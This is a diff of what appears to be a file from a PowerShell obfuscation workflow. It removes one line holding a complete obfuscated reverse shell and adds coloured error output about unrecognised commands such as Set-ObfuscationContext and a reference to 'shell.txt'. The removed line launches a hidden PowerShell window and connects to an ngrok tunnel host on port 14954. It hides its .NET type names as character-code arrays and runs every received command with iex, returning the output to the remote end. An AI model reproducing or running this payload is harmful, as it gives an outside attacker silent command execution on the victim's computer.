@@ -1,2 +1,24 @@
-Start-Process $PSHOME\powershell.exe -ArgumentList {$8QnpxTGc6sq9PoEY = New-Object ([string]::join('', ( (83,121,115,116,101,109,46,78,101,116,46,83,111,99,107,101,116,115,46,84,67,80,67,108,105,101,110,116) |%{$_<##>}|%{ ( [char][int] $_<#i#>)})) |%{<#pbGVENtuDF3I#>$_<#jygSIxEcMJ32rBUutFi#>}| % {$($_)<#y3OeQqbg2Z#>})('0.tcp.in.ngrok.io',14954);$fmYRI5BhT78G1C = $(($(& (("pXQ5yRaH6YxjbzmPqA8hn1OrvMDwKGUW0f7gL-IZsEcoBCe4udFi3tV9JlSk2NT")[51,20,24,43,59,46,37,46,10,0,23,46,40,40,51,43,20] -join '')([string]::join('', ( (36,56,81,110,112,120,84,71,99,54,115,113,57,80,111,69,89,46,71,101,116,83,116,114,101,97,109,40,41) |%{ ( [char][int] $_)})) | % {$_}))));[byte[]]$8QM5j3 = 0..65535|%{$($_)<##>}|%{0};while(($B9QXNF = $fmYRI5BhT78G1C.Read($8QM5j3, 0, $8QM5j3.Length)) -ne 0){;$Oc5tbexJLkTB3Gdh94f1Djg2V = (New-Object -TypeName ([string]::join('', ( (83,121,115,116,101,109,46,84,101,120,116,46,65,83,67,73,73,69,110,99,111,100,105,110,103) |%{<#xSIuDzG2vcX#>$_}|%{ ( [char][int] $_<##>)})) |%{<#1chqb7MWdwin9B8aQ6G2HNJYy#>$_}| % {<##>$_})).GetString($8QM5j3,0, $B9QXNF);$cgCHUEtRyKxpFo5ldMkXQL = (iex $Oc5tbexJLkTB3Gdh94f1Djg2V 2>&1 |%{<#Ff6noVBNjcHRET0sxlS#>$_}| Out-String );$BR4CnLVvq = $cgCHUEtRyKxpFo5ldMkXQL + 'PS ' + (pwd).Path + '> ';$3s = ([text.encoding]::ASCII).GetBytes($BR4CnLVvq);$fmYRI5BhT78G1C.Write($3s,0,$3s.Length);$($fmYRI5BhT78G1C.Flush())};(($($8QnpxTGc6sq9PoEY.Close())))} -WindowStyle Hidden
-
+[91mSet-ObfuscationContext: 
+[96mLine |
+[96m   3 | [0m [96mSet-ObfuscationContext[0m -ScriptBlock '';
+[96m     | [91m ~~~~~~~~~~~~~~~~~~~~~~
+[91m[96m     | [91mThe term 'Set-ObfuscationContext' is not recognized as a name of a cmdlet, function, script file, or executable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.[0m
+[91mSet-ScriptBlockFromFile: 
+[96mLine |
+[96m   4 | [0m [96mSet-ScriptBlockFromFile[0m 'shell.txt';
+[96m     | [91m ~~~~~~~~~~~~~~~~~~~~~~~
+[91m[96m     | [91mThe term 'Set-ScriptBlockFromFile' is not recognized as a name of a cmdlet, function, script file, or executable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.[0m
+[91mTOKEN: 
+[96mLine |
+[96m   5 | [0m [96mTOKEN[0m;
+[96m     | [91m ~~~~~
+[91m[96m     | [91mThe term 'TOKEN' is not recognized as a name of a cmdlet, function, script file, or executable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.[0m
+[91mOUT: 
+[96mLine |
+[96m   6 | [0m [96mOUT[0m;
+[96m     | [91m ~~~
+[91m[96m     | [91mThe term 'OUT' is not recognized as a name of a cmdlet, function, script file, or executable program.
+Check the spelling of the name, or if a path was included, verify that the path is correct and try again.[0m
